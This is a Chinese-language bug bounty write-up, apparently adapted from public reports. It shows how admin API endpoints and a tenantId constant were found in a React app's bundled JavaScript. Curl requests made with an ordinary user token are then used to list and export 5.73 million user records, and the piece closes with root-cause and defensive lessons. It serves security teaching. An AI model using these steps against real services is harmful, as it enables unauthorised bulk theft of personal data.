# 案例 001：JS接口挖掘 → 573万用户数据泄露

> **来源**: 基于公开的HackerOne/Bugcrowd漏洞报告改写，原始报告编号请查阅HackerOne Hacktivity。
> **文中所有URL均已匿名化处理**。
>
> **法律声明**: 本文仅用于安全技术教学。漏洞发现后已通过正规渠道上报并修复。未经授权复现此攻击属于违法行为。

---

## 概述

| 项目 | 内容 |
|------|------|
| 漏洞类型 | 未授权访问 + 数据泄露 |
| 影响范围 | 573万条用户记录（姓名、手机号、邮箱） |
| 严重程度 | 严重（Critical） |
| 起因 | 前端JS中暴露API端点 + 缺少权限校验 |
| 挖洞类型 | 白盒/灰盒测试 |

---

## 一、背景

目标是一个大型互联网平台，前端使用React SPA（单页应用）。页面加载后是一个空白页面，没有任何可交互的功能点、按钮或输入框——看起来就是一个完全没有安全分析价值的静态页面。

正常渗透测试者看到这样的页面会直接放弃转向其他目标。

---

## 二、初始分析

测试者没有放弃，而是打开了浏览器开发者工具（F12）。

> 心法口诀：**"前端空白不代表后端空白"**

### 关键步骤

**Step 1: 查看源代码**
```html
<!-- 页面HTML极其简单 -->
<div id="root"></div>
<script src="/static/js/main.abc123.chunk.js"></script>
```

**Step 2: 下载并分析JS文件**

JS文件经过webpack打包，大约2MB。测试者将JS下载到本地并用格式化工具美化。

**Step 3: 搜索API端点**

在格式化后的JS中搜索关键字符串，包括：`api`、`/v1`、`/v2`、`graphql`、`endpoint`、`baseURL`、`axios`、`fetch`。

找到了大量API端点：
```
POST  /api/v2/user/register
POST  /api/v2/user/login
GET   /api/v2/user/profile
GET   /api/v2/user/search
POST  /api/v2/admin/user/import
GET   /api/v2/admin/dashboard
GET   /api/v2/admin/user/export
GET   /api/v2/admin/user/list
...共计50+个API端点
```

---

## 三、403围墙

测试者尝试访问这些API端点，但全部返回 **403 Forbidden**。

```json
HTTP/1.1 403 Forbidden
{
  "code": 403,
  "message": "Forbidden",
  "requestId": "xxxxx"
}
```

> 此时很多人的反应是"权限控制做得很严，没戏"。

但测试者注意到关键信息——**响应体中返回的 `requestId` 前缀暗示目标使用了AWS API Gateway + Lambda架构**。

---

## 四、从403到突破口

### 4.1 分析错误信息

测试者先尝试访问一个不需要特殊权限的端点 `/api/v2/user/profile`，这次返回的不再是403，而是更有价值的错误：

```json
HTTP/1.1 400 Bad Request
{
  "code": 400,
  "message": "Missing required parameter: tenantId",
  "requestId": "xxxxx"
}
```

**关键发现：请求需要 `tenantId` 参数。**

### 4.2 寻找tenantId

测试者回到JS文件中搜索 `tenantId`，找到了一个枚举值：

```javascript
const TENANT_IDS = {
  PRODUCTION: "prod_tenant_xxxxxxxx",
  STAGING: "staging_tenant_yyyyyyyy",
  INTERNAL: "internal_tenant_zzzzzzzz"
}
```

### 4.3 构造请求

将 `tenantId` 加入请求：
```bash
curl -s "https://api.target.com/api/v2/user/profile?tenantId=prod_tenant_xxxxxxxx" \
  -H "Authorization: Bearer <任意注册用户的token>"
```

返回：
```json
HTTP/1.1 200 OK
{
  "userId": "u_xxxx",
  "name": "测试用户",
  "phone": "138****1234",
  "email": "test@example.com"
}
```

**成功！** 只需要一个简单的注册用户token即可访问个人信息。

---

## 五、进一步挖掘

### 5.1 发现未授权端点

测试者继续遍历JS中的API端点，发现 `/api/v2/admin/user/list` 在加上 `tenantId` 参数后也直接返回了数据，**无需管理员权限**。

```bash
curl -s "https://api.target.com/api/v2/admin/user/list?tenantId=prod_tenant_xxxxxxxx" \
  -H "Authorization: Bearer <普通用户token>"
```

返回：
```json
{
  "total": 5730000,
  "page": 1,
  "pageSize": 100,
  "users": [
    {"userId": "u_0001", "name": "张三", "phone": "13800138001", "email": "zhangsan@example.com"},
    {"userId": "u_0002", "name": "李四", "phone": "13900139002", "email": "lisi@example.com"},
    ...
  ]
}
```

### 5.2 确认漏洞

- 普通用户token即可调用管理端API
- 返回了所有用户详细信息（姓名、手机号、邮箱）
- 573万条记录全部可未授权导出
- 翻页无限制（遍历 `?page=1&pageSize=100` 可获取全部数据）

### 5.3 导出接口

还发现了 `/api/v2/admin/user/export` 端点，可直接导出CSV：

```bash
curl -s "https://api.target.com/api/v2/admin/user/export?tenantId=prod_tenant_xxxxxxxx" \
  -H "Authorization: Bearer <普通用户token>" \
  -o all_users.csv
```

**一劳永逸，无需翻页。** 直接导出全部573万条用户数据。

---

## 六、漏洞根因分析

| 问题 | 说明 |
|------|------|
| 权限校验缺失 | 管理员API仅校验了认证（auth），未校验授权（authZ） |
| 敏感端点暴露 | 前端JS打包了所有API端点，包括管理端 |
| 缺乏分层防御 | API Gateway/WAF未加额外的内部接口保护 |
| tenantId泄漏 | 前端JS中明文写入了生产环境tenantId |

---

## 七、关键教训

### 对白帽子

1. **前端空白不等于没有漏洞** —— 单页应用的JS中可能隐藏海量API
2. **403不是终点，是起点** —— 403意味着你接近了目标，只是差一个参数或Header
3. **报错信息是最好的老师** —— "Missing required parameter" 比 403 有价值得多
4. **搜索JS不能只搜URL** —— 还要搜参数名、常量值、函数命名规律
5. **普通用户权限也不要放过** —— 很多漏洞的入口就是普通权限

### 对防御方

1. **前端不存敏感信息** —— tenantId、API密钥不要硬编码在JS中
2. **认证≠授权** —— 必须校验用户是否有权限执行操作
3. **API端点前后端分离** —— 管理端API不应出现在用户侧JS中
4. **默认拒绝原则** —— 未显式授权的访问一律拒绝

---

## 八、技术要点总结

```
攻击链:
  空白页面 → JS反编译 → API端点发现 → 403
  → 分析报错信息 → 提取tenantId → 添加参数
  → 未授权访问管理API → 573万用户数据泄露

关键工具:
  - 浏览器DevTools (F12 → Sources/Network)
  - JS美化工具 (Prettier / JSBeautifier)
  - grep/js正则搜索 (搜索api、url、secret、token等关键词)
  - curl / Postman (快速构造请求测试)
```

---

> **心法**: 每次遇到403，问自己：是"真拒绝"还是"差个参数"？报错信息里藏着的提示，往往比200 OK更值钱。
